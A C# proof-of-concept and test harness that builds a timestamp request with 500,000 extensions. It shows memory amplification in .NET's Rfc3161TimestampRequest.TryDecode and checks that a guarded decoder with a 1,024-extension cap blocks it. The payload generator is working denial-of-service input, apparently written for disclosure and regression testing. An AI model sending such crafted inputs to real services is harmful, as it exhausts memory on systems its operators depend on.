using System.Diagnostics;
using System.Formats.Asn1;
using System.Security.Cryptography;
using System.Security.Cryptography.Pkcs;
using System.Text.Json;

const int AttackCount = 500_000;
const int DefaultLimit = 1_024;

byte[] attack = BuildTimestampRequest(AttackCount, 0, uniqueOids: true);
byte[] control = BuildToTarget(filler => BuildTimestampRequest(1, filler, uniqueOids: true), attack.Length);

Measurement stockAttack = MeasureStock(attack, AttackCount);
Measurement stockControl = MeasureStock(control, 1);
Measurement fixedAttack = MeasureGuarded(attack, DefaultLimit);
Measurement fixedControl = MeasureGuarded(control, DefaultLimit);
Measurement unlimitedAttack = MeasureGuarded(attack, -1);

byte[] boundary1024 = BuildTimestampRequest(1_024, 0, uniqueOids: true);
byte[] boundary1025 = BuildTimestampRequest(1_025, 0, uniqueOids: true);
bool accepted1024 = GuardedTryDecode(boundary1024, DefaultLimit, out _, out _, out int count1024);
bool accepted1025 = GuardedTryDecode(boundary1025, DefaultLimit, out _, out _, out int count1025);

string assemblyPath = typeof(Rfc3161TimestampRequest).Assembly.Location;
FileVersionInfo fvi = FileVersionInfo.GetVersionInfo(assemblyPath);
double ratio = stockControl.AllocatedBytes == 0 ? 0 : (double)stockAttack.AllocatedBytes / stockControl.AllocatedBytes;

bool verdict =
    attack.Length == control.Length &&
    stockAttack.Accepted && stockControl.Accepted &&
    stockAttack.ExtensionCount == AttackCount && stockControl.ExtensionCount == 1 &&
    stockAttack.AllocatedBytes >= 80_000_000 && ratio >= 15.0 &&
    !fixedAttack.Accepted && fixedAttack.RejectedByLimit && fixedAttack.ExtensionCount == DefaultLimit + 1 && fixedAttack.AllocatedBytes < 5_000_000 &&
    fixedControl.Accepted && !fixedControl.RejectedByLimit && fixedControl.ExtensionCount == 1 &&
    unlimitedAttack.Accepted && !unlimitedAttack.RejectedByLimit && unlimitedAttack.ExtensionCount == AttackCount && unlimitedAttack.AllocatedBytes >= 80_000_000 &&
    accepted1024 && !accepted1025 && count1024 == 1_024 && count1025 == 1_025;

var output = new
{
    framework = System.Runtime.InteropServices.RuntimeInformation.FrameworkDescription,
    sdkTarget = AppContext.TargetFrameworkName,
    pkcsAssembly = typeof(Rfc3161TimestampRequest).Assembly.FullName,
    pkcsAssemblyPath = assemblyPath,
    pkcsFileVersion = fvi.FileVersion,
    pkcsProductVersion = fvi.ProductVersion,
    attackCount = AttackCount,
    attackInputBytes = attack.Length,
    controlInputBytes = control.Length,
    sameSize = attack.Length == control.Length,
    uniqueExtensionOids = true,
    stockAttack,
    stockControl,
    allocationRatio = ratio,
    fixedAttack,
    fixedControl,
    unlimitedAttack,
    boundary = new { max = DefaultLimit, accepted1024, accepted1025, count1024, count1025 },
    markers = new
    {
        RESULT_EQUAL_SIZE = attack.Length == control.Length ? 1 : 0,
        RESULT_STOCK_ATTACK_ACCEPTED = stockAttack.Accepted ? 1 : 0,
        RESULT_STOCK_CONTROL_ACCEPTED = stockControl.Accepted ? 1 : 0,
        RESULT_ALLOCATION_AMPLIFICATION = stockAttack.AllocatedBytes >= 80_000_000 && ratio >= 15.0 ? 1 : 0,
        RESULT_FIXED_ATTACK_BLOCKED = !fixedAttack.Accepted && fixedAttack.RejectedByLimit ? 1 : 0,
        RESULT_FIXED_CONTROL_PRESERVED = fixedControl.Accepted ? 1 : 0,
        RESULT_BOUNDARY = accepted1024 && !accepted1025 ? 1 : 0,
        RESULT_UNLIMITED_REOPENS = unlimitedAttack.Accepted && unlimitedAttack.AllocatedBytes >= 80_000_000 ? 1 : 0,
        RESULT_ALL_ASSERTIONS = verdict ? 1 : 0,
    },
    verdict = verdict ? "PASS" : "FAIL",
};

string json = JsonSerializer.Serialize(output, new JsonSerializerOptions { WriteIndented = true });
Console.WriteLine(json);
return verdict ? 0 : 1;

static Measurement MeasureStock(byte[] bytes, int expectedExtensionCount)
{
    GC.Collect(); GC.WaitForPendingFinalizers(); GC.Collect();
    long before = GC.GetTotalAllocatedBytes(precise: true);
    Stopwatch sw = Stopwatch.StartNew();
    bool accepted = Rfc3161TimestampRequest.TryDecode(bytes, out Rfc3161TimestampRequest? request, out int consumed);
    int extensionCount = accepted ? expectedExtensionCount : 0;
    sw.Stop();
    long allocated = GC.GetTotalAllocatedBytes(precise: true) - before;
    GC.KeepAlive(request);
    return new Measurement(accepted, false, consumed, extensionCount, allocated, sw.Elapsed.TotalMilliseconds);
}

static Measurement MeasureGuarded(byte[] bytes, int maxExtensions)
{
    GC.Collect(); GC.WaitForPendingFinalizers(); GC.Collect();
    long before = GC.GetTotalAllocatedBytes(precise: true);
    Stopwatch sw = Stopwatch.StartNew();
    bool accepted = GuardedTryDecode(bytes, maxExtensions, out Rfc3161TimestampRequest? request, out int consumed, out int extensionCount);
    bool rejectedByLimit = !accepted && maxExtensions >= 0 && extensionCount > maxExtensions;
    sw.Stop();
    long allocated = GC.GetTotalAllocatedBytes(precise: true) - before;
    GC.KeepAlive(request);
    return new Measurement(accepted, rejectedByLimit, consumed, extensionCount, allocated, sw.Elapsed.TotalMilliseconds);
}

static bool GuardedTryDecode(ReadOnlyMemory<byte> encoded, int maxExtensions, out Rfc3161TimestampRequest? request, out int consumed, out int extensionCount)
{
    request = null;
    consumed = 0;
    extensionCount = 0;
    try
    {
        AsnReader reader = new(encoded, AsnEncodingRules.DER);
        AsnReader sequence = reader.ReadSequence();
        _ = sequence.ReadInteger();
        AsnReader imprint = sequence.ReadSequence();
        AsnReader algorithm = imprint.ReadSequence();
        _ = algorithm.ReadObjectIdentifier();
        if (algorithm.HasData) _ = algorithm.ReadEncodedValue();
        algorithm.ThrowIfNotEmpty();
        _ = imprint.ReadOctetString();
        imprint.ThrowIfNotEmpty();

        if (sequence.HasData && sequence.PeekTag().HasSameClassAndValue(Asn1Tag.ObjectIdentifier)) _ = sequence.ReadObjectIdentifier();
        if (sequence.HasData && sequence.PeekTag().HasSameClassAndValue(Asn1Tag.Integer)) _ = sequence.ReadIntegerBytes();
        if (sequence.HasData && sequence.PeekTag().HasSameClassAndValue(Asn1Tag.Boolean)) _ = sequence.ReadBoolean();

        Asn1Tag extensionsTag = new(TagClass.ContextSpecific, 0, isConstructed: true);
        if (sequence.HasData && sequence.PeekTag().HasSameClassAndValue(extensionsTag))
        {
            AsnReader extensions = sequence.ReadSequence(extensionsTag);
            while (extensions.HasData)
            {
                extensionCount++;
                if (maxExtensions >= 0 && extensionCount > maxExtensions) return false;
                _ = extensions.ReadEncodedValue();
            }
        }

        sequence.ThrowIfNotEmpty();
        reader.ThrowIfNotEmpty();
        return Rfc3161TimestampRequest.TryDecode(encoded, out request, out consumed);
    }
    catch (AsnContentException)
    {
        request = null; consumed = 0; return false;
    }
    catch (CryptographicException)
    {
        request = null; consumed = 0; return false;
    }
}

static byte[] BuildToTarget(Func<int, byte[]> builder, int target)
{
    int low = 0;
    int high = Math.Max(1, target);
    while (builder(high).Length < target) high = checked(high * 2);
    while (low <= high)
    {
        int mid = low + ((high - low) / 2);
        int len = builder(mid).Length;
        if (len == target) return builder(mid);
        if (len < target) low = mid + 1; else high = mid - 1;
    }
    byte[] below = builder(Math.Max(0, high));
    byte[] above = builder(low);
    return Math.Abs(target - below.Length) <= Math.Abs(above.Length - target) ? below : above;
}

static byte[] BuildTimestampRequest(int extensionCount, int fillerBytes, bool uniqueOids)
{
    AsnWriter writer = new(AsnEncodingRules.DER);
    writer.PushSequence();
    writer.WriteInteger(1);
    writer.PushSequence();
    writer.PushSequence();
    writer.WriteObjectIdentifier("2.16.840.1.101.3.4.2.1");
    writer.WriteNull();
    writer.PopSequence();
    writer.WriteOctetString(new byte[32]);
    writer.PopSequence();

    Asn1Tag extTag = new(TagClass.ContextSpecific, 0, isConstructed: true);
    writer.PushSequence(extTag);
    for (int i = 0; i < extensionCount; i++)
    {
        writer.PushSequence();
        writer.WriteObjectIdentifier(uniqueOids ? $"1.3.6.1.4.1.55555.1.{i + 1}" : "1.2.3.4");
        writer.WriteOctetString(i == 0 && fillerBytes > 0 ? new byte[fillerBytes] : Array.Empty<byte>());
        writer.PopSequence();
    }
    writer.PopSequence(extTag);
    writer.PopSequence();
    return writer.Encode();
}

internal sealed record Measurement(bool Accepted, bool RejectedByLimit, int Consumed, int ExtensionCount, long AllocatedBytes, double ElapsedMs);
